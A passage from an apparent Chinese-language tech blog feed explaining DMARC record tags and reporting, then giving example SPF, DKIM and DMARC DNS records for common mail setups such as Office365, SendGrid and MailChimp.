&lt;p&gt;即 percentage，就是要套用此 policy 的比例，概念上類似隨機 dropout 讓一部分的信件就算驗證結果是 fail 還是直接算他通過。因為 DMARC 可能導致信件突然都寄不到，所以為了不要讓這種 all-or-nothing 的特性導致大家不敢使用 DMARC，延伸出這種部分套用的機制，可以讓寄信方先實驗看看。不管信件是否因為 &lt;code&gt;pct&lt;/code&gt; 機制而被保留，所有驗證 fail 的信件都會出現在彙整報告，方便寄信方 debug。&lt;/p&gt;
&lt;p&gt;如果一封信因為 &lt;code&gt;pct&lt;/code&gt; 機制而被保留，採取的 action 因 policy 而異，基本上是放寬一個等級。例如本來要 &lt;code&gt;quarantine&lt;/code&gt; 的就變成 &lt;code&gt;none&lt;/code&gt;，本來該 &lt;code&gt;reject&lt;/code&gt; 的就變成 &lt;code&gt;quarantine&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;num&lt;/code&gt; 介於 0 到 100 之間，預設是 100，也就是全部套用。&lt;/p&gt;
&lt;h3 id=&quot;alignment-%E7%9B%B8%E9%97%9C&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#alignment-%E7%9B%B8%E9%97%9C&quot;&gt;#&lt;/a&gt; alignment 相關&lt;/h3&gt;
&lt;h5 id=&quot;aspf&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#aspf&quot;&gt;#&lt;/a&gt; aspf&lt;/h5&gt;
&lt;p&gt;語法為： &lt;code&gt;aspf=mode&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;代表 alignment SPF，也就是在進行 SPF 的 alignment 檢查時採取的方式，預設為 &lt;code&gt;r&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;可能的標籤值為：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;r&lt;/code&gt; (relaxed)：寬鬆的比對，&lt;code&gt;smtp.MailFrom&lt;/code&gt; 與 &lt;code&gt;header.From&lt;/code&gt; 只要 organizational domain 相同即可（同一個根網域）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s&lt;/code&gt; (strict)：嚴格的比對，&lt;code&gt;smtp.MailFrom&lt;/code&gt; 與 &lt;code&gt;header.From&lt;/code&gt; 需完全相同。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;adkim&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#adkim&quot;&gt;#&lt;/a&gt; adkim&lt;/h5&gt;
&lt;p&gt;語法為：&lt;code&gt;adkim=mode&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;代表 alignment DKIM，也就是在進行 DKIM 的 alignment 檢查時採取的方式，預設為 &lt;code&gt;r&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;可能的標籤值為：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;r&lt;/code&gt; (relaxed)：寬鬆的比對，DKIM signature 的 &lt;code&gt;d=&lt;/code&gt; 與 &lt;code&gt;header.From&lt;/code&gt; 只要 organizational domain 相同即可（同一個根網域）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s&lt;/code&gt; (strict)：嚴格的比對，DKIM signature 的 &lt;code&gt;d=&lt;/code&gt; 與 &lt;code&gt;header.From&lt;/code&gt; 需完全相同。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;%E5%A0%B1%E5%91%8A%E7%9B%B8%E9%97%9C&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%A0%B1%E5%91%8A%E7%9B%B8%E9%97%9C&quot;&gt;#&lt;/a&gt; 報告相關&lt;/h3&gt;
&lt;h5 id=&quot;rua&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#rua&quot;&gt;#&lt;/a&gt; rua&lt;/h5&gt;
&lt;p&gt;語法為：&lt;code&gt;rua=addr1,addr2,addr3…&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;指示彙整報告（aggregate report）要寄送的位置，值為一串由逗號（&lt;code&gt;,&lt;/code&gt;）分隔的 DMARC URI。RFC 定義 DMARC URI 為 &lt;code&gt;mailto:emailaddress&lt;/code&gt;，例如 &lt;code&gt;mailto:woohoo@gmail.com&lt;/code&gt;，如果指定了不合法的郵件位置會被忽略。&lt;/p&gt;
&lt;p&gt;不合法的 DMARC URI 地雷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;收信人網域沒有 MX 紀錄：例如指定 &lt;a href=&quot;mailto:abc@no-mx.com&quot;&gt;abc@no-mx.com&lt;/a&gt;，因為 &lt;a href=&quot;http://no-mx.com/&quot;&gt;no-mx.com&lt;/a&gt; 沒有 MX 紀錄，所以此信無法寄送。&lt;/li&gt;
&lt;li&gt;收信地址中有逗號（&lt;code&gt;,&lt;/code&gt;）或是驚嘆號（&lt;code&gt;!&lt;/code&gt;）：會造成解析上錯誤而被忽略。如必要請記得做 escaping 或 quoting。&lt;/li&gt;
&lt;li&gt;收信人網域沒有授權接收報告：如果收信人網域跟 DMARC 紀錄網域相同不會有這個問題，不過如果今天指定報告要寄送其他網域，則指定收信人網域需要在 &lt;code&gt;&amp;lt;dmarc domain&amp;gt;._report._dmarc.&amp;lt;reporting domain&amp;gt;&lt;/code&gt; 發一筆 DMARC 紀錄來授權報告寄送。假設 DMARC 紀錄網域：&lt;a href=&quot;http://sender.com/&quot;&gt;sender.com&lt;/a&gt;，收報告地址為：report@thirdparty.com，則 &lt;a href=&quot;http://thirdparty.com/&quot;&gt;thirdparty.com&lt;/a&gt; 要在 &lt;code&gt;sender.com._report._dmarc.thirdparty.com&lt;/code&gt; 發一筆內容為 &lt;code&gt;v=DMARC1&lt;/code&gt; 的 TXT 紀錄。這個機制的目的一來是為了防止有人故意用大量報告對第三方的收信人做垃圾信件攻擊（spamming），二來也是保護發行 DMARC 紀錄的網域不要讓過多資訊外流。豆知識：有些提供 DMARC reporting 的第三方服務（例如 &lt;a href=&quot;http://dmarcanalyzer.com/&quot;&gt;dmarcanalyzer.com&lt;/a&gt;），就會設定 &lt;code&gt;*._report._dmarc.rep.dmarcanalyzer.com TXT &amp;quot;v=DMARC1;&amp;quot;&lt;/code&gt; 允許接收所有報告哦！&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;彙整報告包含所有信件的 DMARC 驗證情況，不論成功還是失敗都會紀錄，內容包含採用的 DMARC 紀錄、SPF 與 DKIM 的結果、alignment 細節、最後的 policy 與實際執行的 action、還有驗證結果的統計數字等等。&lt;/p&gt;
&lt;h5 id=&quot;ruf&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#ruf&quot;&gt;#&lt;/a&gt; ruf&lt;/h5&gt;
&lt;p&gt;語法為：&lt;code&gt;ruf=addr1,addr2,addr3…&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;指示失敗報告（failure report）要寄送的位置，值為一串由逗號（&lt;code&gt;,&lt;/code&gt;）分隔的 DMARC URI。語法與地雷皆同上。&lt;/p&gt;
&lt;p&gt;失敗報告與彙整報告不同在於：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;彙整報告是每日（或是其他指定的區間）寄送一份，但失敗報告是在 DMARC 驗證失敗時馬上通知。&lt;/li&gt;
&lt;li&gt;失敗報告包含更詳細的資訊，例如原信件內容。&lt;/li&gt;
&lt;li&gt;失敗報告用於鑑識，觸發條件可以用下面的 &lt;code&gt;fo&lt;/code&gt; 更細微控制。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;fo&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#fo&quot;&gt;#&lt;/a&gt; fo&lt;/h5&gt;
&lt;p&gt;語法為：&lt;code&gt;fo=0:1:d:s&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;用來指示失敗報告的觸發機制，值為一串由冒號（&lt;code&gt;:&lt;/code&gt;）分隔的標籤值（多選），預設為 &lt;code&gt;0&lt;/code&gt;。若 DMARC 紀錄中沒有 &lt;code&gt;ruf&lt;/code&gt;，&lt;code&gt;fo&lt;/code&gt; 會被忽略。&lt;/p&gt;
&lt;p&gt;標籤值為：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt;：如果沒有任何一種驗證得出 pass，也就是當 SPF、DKIM、alignment 通通都失敗的時候。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1&lt;/code&gt;：如果有任何一種驗證&lt;strong&gt;沒有&lt;/strong&gt;得出 pass，也就是當 SPF、DKIM、alignment 有至少其中一種失敗的時候。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;d&lt;/code&gt;：如果 DKIM 驗證失敗（不管 alignment）就觸發。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s&lt;/code&gt;：如果 SPF 驗證失敗（不管 alignment）就觸發。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;rf&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#rf&quot;&gt;#&lt;/a&gt; rf&lt;/h5&gt;
&lt;p&gt;語法為： &lt;code&gt;rf=afrf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;定義失敗報告的格式，目前只有 &lt;code&gt;afrf&lt;/code&gt; 一種，同樣是預設值。&lt;/p&gt;
&lt;h5 id=&quot;ri&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#ri&quot;&gt;#&lt;/a&gt; ri&lt;/h5&gt;
&lt;p&gt;語法為： &lt;code&gt;ri=sec&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;收到彙整報告的區間，單位為秒，預設是 86400，也就是一天。你也可以設定每幾小時接收報告，不過為了避免造成收信方太大負擔，小於一天的報告區間採 best effort 寄送（白話文：我盡量啦）。&lt;/p&gt;
&lt;h3 id=&quot;%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F-2&quot;&gt;#&lt;/a&gt; 多個子網域&lt;/h3&gt;
&lt;p&gt;如果你有多個會寄信的網域，其實不需要為他們分別設置 DMARC 紀錄。我們上面提過的 &lt;code&gt;sp&lt;/code&gt; 標籤就是為了讓你可以在根網域的 DMARC 紀錄指示子網域的 policy。&lt;/p&gt;
&lt;h3 id=&quot;%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99-2&quot;&gt;#&lt;/a&gt; 第三方服務&lt;/h3&gt;
&lt;p&gt;如果你在 SPF 跟 DKIM 有設好，第三方服務對 DMARC 的影響會在 alignment 的部分。我們說過， &lt;code&gt;smtp.MailFrom&lt;/code&gt; 跟 &lt;code&gt;header.From&lt;/code&gt; 可以不同，所以如果你透過 Sendgrid 等服務寄信，SPF 驗證會通過但是 alignment 就會失敗。不過好在 alignment 檢查只要 SPF 或 DKIM 通過就行了，所以回到前面介紹 DKIM 與第三方服務的部分，這裡用的是我們自己的 &lt;code&gt;d=&lt;/code&gt; 網域，所以 alignment 就沒問題了。&lt;/p&gt;
&lt;p&gt;另一種會出事的場景是轉發（forwarding），也就是有一個中繼 email server 要在不影響 authentication 的情況下傳遞原汁原味的信件。因為多了一個中間人，所以 SPF 會驗證失敗，而 DKIM 雖然會驗證成功，但在 alignment 檢查又會被擋下。這種多 hop 傳遞的情況在現實世界中是很常見的，但是 DMARC 的機制會使這些信件驗證失敗，因此延伸出了我們下一篇會再來聊聊的 ARC （Authentication Recieved Chain）機制。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;%E7%B5%90%E8%AB%96&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AB%96&quot;&gt;#&lt;/a&gt; 結論&lt;/h2&gt;
&lt;p&gt;終於整理完繁瑣的各種細節了（撒花！）這兩篇基本上把 RFC 定義翻譯了一遍，不過因為這些機制都還不算太成熟，所以設定未來都還是可能變動的。&lt;/p&gt;
&lt;p&gt;我自己在設定這些的時候是配合著原始信件內容跟彙整報告檢視三劍客的有效性跟正確性，建議大家可以測試的時候可以多寄到幾個不同的信箱（例如 gmail、outlook、hotmail、yahoo …）看看 action 的不同。如果要偽冒寄信的話可以用線上的 Emkei’s Fake Mailer 來檢視信件是否真的有被擋下來。&lt;/p&gt;
&lt;p&gt;不過，即使是驗證全都 pass 的信件還是有可能進垃圾信或是被擋下的喔！因為 DMARC 只是 MDA 參考的其中一個 filter，其他因素，例如內容重複性太高或是有奇怪連結、圖片、檔案等等也是會導致信件被過濾的。畢竟可是有很多 email security 廠商在努力幫大家擋掉釣魚跟垃圾信呢 XDDD&lt;/p&gt;
&lt;p&gt;關於 SPF、DKIM、DMARC 的原理與設置大致就到這，下一篇我們會來探討這些機制的不足、延伸的問題、和更多 email security 的小知識！&lt;/p&gt;
&lt;h3 id=&quot;reference%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#reference%3A&quot;&gt;#&lt;/a&gt; Reference:&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc7208&quot;&gt;SPF RFC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc6376&quot;&gt;DKIM RFC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc7489&quot;&gt;DMARC RFC&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

		</content>
	</entry>
	
	<entry>
		<title>關於 email security 的大小事 — 範例篇</title>
		<link href="https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples/"/>
		<updated>2021-07-16T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;p&gt;有鑒於大家了解了 SPF、DKIM、DMARC 設置上的原理與地雷後，對於如何設置可能還是霧颯颯，因此決定再推出範例篇讓大家看一些實際的紀錄以及設置方式。希望可以讓大家輕鬆做好 email security！&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;以下有不懂的標籤可以參照設定篇：&lt;br&gt;
SPF 的設定 👉 &lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf&quot;&gt;關於 email security 的大小事 — 設定篇 SPF&lt;/a&gt;&lt;br&gt;
DKIM、DMARC 的設定 👉 &lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc&quot;&gt;關於 email security 的大小事 — 設定篇 DKIM、DMARC&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以下主要以 &lt;a href=&quot;https://mxtoolbox.com/SuperTool.aspx?run=toolpage&quot;&gt;mxtoolbox&lt;/a&gt; 作為紀錄查詢工具。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;spf&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#spf&quot;&gt;#&lt;/a&gt; SPF&lt;/h2&gt;
&lt;p&gt;在設定 SPF 時最重要的就是知道『有哪些寄信的網域』。我們用幾種情境舉例：&lt;/p&gt;
&lt;h3 id=&quot;%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%8F%AA%E6%9C%89%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%8F%AA%E6%9C%89%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F&quot;&gt;#&lt;/a&gt; 情境一：只有自家網域&lt;/h3&gt;
&lt;p&gt;首先，你需要知道自己有哪些 mail server 。&lt;/p&gt;
&lt;p&gt;這時你有下面幾種選項：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;mail server 與寄信 domain 相同(IP 同)&lt;/strong&gt;，允許 IP 就是此 domain 的 IP：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;v=spf1 a -all&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;mail server 與寄信 domain 相同(IP 不同)&lt;/strong&gt;，允許 IP 就是 mail server 的 IP：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;v=spf1 mx -all&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;mail server 與寄信 domain 不同，或是有多台 mail server&lt;/strong&gt;，需一一列出：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;v=spf1 mx:mail-server-1 mx:mail-server-2 mx:mail-server-3 -all&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;已經有別的寄信 domain 設置好 SPF&lt;/strong&gt; ，例如 google 自己是 email provider 又同時提供 email hosting，以下為 &lt;a href=&quot;http://gmail.com/&quot;&gt;gmail.com&lt;/a&gt; 的 SPF 紀錄：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;v=spf1 redirect=_spf.google.com&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建議如果想省下 DNS query 的扣打，可以考慮 &lt;strong&gt;展開成 &lt;code&gt;ip4&lt;/code&gt; &lt;code&gt;ip6&lt;/code&gt; 機制&lt;/strong&gt;，例如以下為 MailChimp（&lt;a href=&quot;http://servers.mcsv.net/&quot;&gt;servers.mcsv.net&lt;/a&gt;）的 SPF 紀錄：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;v=spf1 ip4:205.201.128.0/20 ip4:198.2.128.0/18 ip4:148.105.8.0/21 -all&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%9B%B2%E7%AB%AF%E6%88%96%E6%98%AF%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%9B%B2%E7%AB%AF%E6%88%96%E6%98%AF%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F&quot;&gt;#&lt;/a&gt; 情境二：使用雲端或是第三方網域&lt;/h3&gt;
&lt;p&gt;當你使用第三方網域寄信，就必須把他們的 mail server 也放到自己的 SPF 紀錄中，一般而言他們都已經有設好 SPF 紀錄了，所以你只要用 &lt;code&gt;include&lt;/code&gt; 機制就可以涵蓋。請去查詢他們設置 SPF 的 domain 然後加到紀錄中：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;v=spf1 include:third-1 include:third-2 include:third-3 -all&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;***文末附上最近整理的常見第三方 SPF domain***&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;以 OneDegree 為例，我們使用的 hosting provider 為 Microsoft Office365，第三方服務為： SendGrid、MailChimp、FreshDesk。去網站上查一下或是在服務的 portal 裡應該就能輕鬆找到設置 SPF 的 domain，例如下圖是 MailChimp 的文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-examples/mailchimp.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;資料收集完成，就能初步建構出我們的 SPF 紀錄：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;v=spf1 include:spf.protection.outlook.com include:sendgrid.net include:servers.mcsv.net include:email.freshdesk.com -all&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再來就是優化的部分，你可以去 &lt;a href=&quot;https://mxtoolbox.com/SuperTool.aspx?run=toolpage&quot;&gt;mxtoolbox&lt;/a&gt; 逐一查詢以上 include 的這些紀錄，會發現 &lt;a href=&quot;http://email.freshdesk.com/&quot;&gt;email.freshdesk.com&lt;/a&gt; 已經包含了 &lt;a href=&quot;http://sendgrid.net/&quot;&gt;sendgrid.net&lt;/a&gt; ，也就是說其實我們自己的紀錄中已經重複 include 了，造成一次多餘的 DNS query。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-examples/mxtoolbox.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;排除重複的部分，我們就能得到最終的 SPF 紀錄：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;v=spf1 include:spf.protection.outlook.com include:servers.mcsv.net include:email.freshdesk.com -all&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%90%8C%E6%99%82%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F%E8%B7%9F%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%90%8C%E6%99%82%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%B6%E7%B6%B2%E5%9F%9F%E8%B7%9F%E7%AC%AC%E4%B8%89%E6%96%B9%E7%B6%B2%E5%9F%9F&quot;&gt;#&lt;/a&gt; 情境三：同時使用自家網域跟第三方網域&lt;/h3&gt;
&lt;p&gt;這應該是最常見的情況了。只要結合上面的兩個情境就行，一般來說會把自家的 &lt;code&gt;a&lt;/code&gt; &lt;code&gt;mx&lt;/code&gt; 放前面，&lt;code&gt;include&lt;/code&gt; 的放後面，不過這也沒有規定，純粹閱讀方便就是了。&lt;/p&gt;
&lt;p&gt;要特別注意的是，如果你有用到 &lt;code&gt;redirect&lt;/code&gt; 記得要放最後，因為 &lt;code&gt;redirect&lt;/code&gt; 是一種 modifier，也就是前面的 mechanism 都沒有 match 才會執行，相對的，跳到 &lt;code&gt;redirect&lt;/code&gt; 的 SPF 紀錄之後，就會以那筆 SPF 紀錄為主，本來在 &lt;code&gt;redirect&lt;/code&gt; 後面的東西都會被忽略。所以如果要用就要長這樣：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;v=spf1 mx include:spf.protection.outlook.com include:sendgrid.net redirect:_spf.PROVIDERSERVER.COM&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84&quot;&gt;#&lt;/a&gt; 發布紀錄&lt;/h3&gt;
&lt;p&gt;建構好 SPF 紀錄後請在你的 DNS 裡以 TXT 類型發布出去，等待幾分鐘應該就可以在 mxtoolbox 上查詢到了。使用雲端 hosting provider服務請一樣參考官方文件：&lt;a href=&quot;https://support.google.com/a/answer/10684623?hl=en&amp;amp;ref_topic=10685331&quot;&gt;Gsuite&lt;/a&gt;、&lt;a href=&quot;https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/set-up-spf-in-office-365-to-help-prevent-spoofing?view=o365-worldwide#create-or-update-your-spf-txt-record&quot;&gt;Office365&lt;/a&gt;、&lt;a href=&quot;https://docs.aws.amazon.com/ses/latest/DeveloperGuide/send-email-authentication-spf.html&quot;&gt;Amazon SES&lt;/a&gt;。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;dkim&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#dkim&quot;&gt;#&lt;/a&gt; DKIM&lt;/h2&gt;
&lt;p&gt;DKIM 不同於 SPF 在於，一筆 SPF 紀錄就代表了一個寄信 domain，因此你有幾個會寄信的 domain 就要有幾筆 SPF 紀錄，但是 DKIM 是一個 domain 可以有很多筆的，只要各個 mail server 使用的 selector 都不同就好。&lt;/p&gt;
&lt;h3 id=&quot;%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E8%87%AA%E6%9E%B6%E7%9A%84-email-server&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E8%87%AA%E6%9E%B6%E7%9A%84-email-server&quot;&gt;#&lt;/a&gt; 情境一：自架的 email server&lt;/h3&gt;
&lt;p&gt;可以用這個 &lt;a href=&quot;https://dmarcly.com/tools/dkim-record-generator&quot;&gt;DKIM generator&lt;/a&gt; 來產生公私鑰，請把私鑰放入 mail server 設定中保管好，然後把公鑰從 DNS 發布出去。&lt;/p&gt;
&lt;h3 id=&quot;%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E9%9B%B2%E7%AB%AF-hosting-provider&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E9%9B%B2%E7%AB%AF-hosting-provider&quot;&gt;#&lt;/a&gt; 情境二：雲端 hosting provider&lt;/h3&gt;
&lt;p&gt;如果你使用的是雲端 hosting provider 的服務，例如用 Microsoft Office365 或是 Gsuite，那麼 DKIM 的設定已經內建了幾乎不用你做。如果你想用自己的key pair 也可以，跟著教學設定：&lt;a href=&quot;https://support.google.com/a/answer/174126&quot;&gt;Gsuite&lt;/a&gt;、&lt;a href=&quot;https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/use-dkim-to-validate-outbound-email?view=o365-worldwide&quot;&gt;Office365&lt;/a&gt;、&lt;a href=&quot;https://docs.aws.amazon.com/ses/latest/DeveloperGuide/send-email-authentication-dkim-easy-setup-domain.html&quot;&gt;Amazon SES&lt;/a&gt; 就可以了，他還會幫你發布到 DNS。&lt;/p&gt;
&lt;h3 id=&quot;%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99&quot;&gt;#&lt;/a&gt; 情境三：第三方服務&lt;/h3&gt;
&lt;p&gt;如果是其他第三方服務（marketing email 等等），做法往往是請你發一筆 CNAME 紀錄指到由第三方服務實際創造並發布的公鑰，這樣就可以由第三方服務統一管理公私鑰，你也不用擔心 DKIM 沒發好。&lt;/p&gt;
&lt;p&gt;舉例來說，如果是用 SendGrid，完成 “Settings/Sender Authentication/Authenticate Your Domain” 的流程後會來到這一頁：&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-examples/dmarcly.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;from &lt;a href=&quot;https://dmarcly.com/blog/how-to-set-up-spf-and-dkim-for-sendgrid&quot;&gt;DMARCLY tutorial&lt;/a&gt;&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;你就照著發在 DNS 就好，如下：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;//我們發布的&lt;br&gt;s1._domainkey.example.com CNAME s1.domainkey.uXXX.wlXXX.sendgrid.net&lt;br&gt;&lt;br&gt;//sendgrid 發布的&lt;br&gt;s1.domainkey.uXXX.wlXXX.sendgrid.net TXT &quot;v=DKIM1; k=rsa;....&quot;&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h2 id=&quot;dmarc&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#dmarc&quot;&gt;#&lt;/a&gt; DMARC&lt;/h2&gt;
&lt;p&gt;以下皆建議採最嚴格的設置，若擔心使用 &lt;code&gt;p=reject&lt;/code&gt; 會太過嚴苛造成困擾請至少使用 &lt;code&gt;p=quarantine&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;以下範例請把 &lt;code&gt;rua&lt;/code&gt; 跟 &lt;code&gt;ruf&lt;/code&gt; 中的 &lt;code&gt;xx&lt;/code&gt; 換成自己的信箱。可以在寄信網域中設定一個專門接收報告的信箱（例如 OneDegree 就創立了一個 &lt;code&gt;dmarc.reporting@onedegree.hk&lt;/code&gt;），或是如果有使用第三方的 DMARC reporting 功能（例如 &lt;a href=&quot;http://dmarcanalyzer.com/&quot;&gt;dmarcanalyzer.com&lt;/a&gt;）就換成他們提供的信箱。&lt;/p&gt;
